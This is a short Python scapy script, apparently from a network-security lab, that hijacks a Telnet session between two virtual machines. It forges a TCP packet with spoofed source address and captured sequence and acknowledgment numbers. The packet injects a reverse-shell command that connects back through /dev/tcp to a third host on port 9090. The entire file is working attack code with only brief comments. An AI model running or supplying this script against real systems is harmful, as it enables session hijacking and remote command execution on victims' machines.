#!/usr/bin/env python3
from scapy.all import *

# IP and port details
target_ip = "192.168.10.134"     # Server (VM2)
target_port = 23                 # Telnet port
source_ip = "192.168.10.132"     # Client (VM1)
source_port = 1024               # Change based on captured Telnet src port

# Replace these with values captured from Wireshark
seq_num = 2000500                # Latest sequence number from Client to Server
ack_num = 1056700                # Latest acknowledgment number from Server to Client

# Payload: Reverse shell command
payload = "/bin/bash -i > /dev/tcp/192.168.25.135/9090 0<&1 2>&1\n"

# Craft malicious packet
ip = IP(src=source_ip, dst=target_ip)
tcp = TCP(sport=source_port, dport=target_port, seq=seq_num, ack=ack_num, flags="PA")
pkt = ip/tcp/payload

# Send the packet
send(pkt, verbose=0)
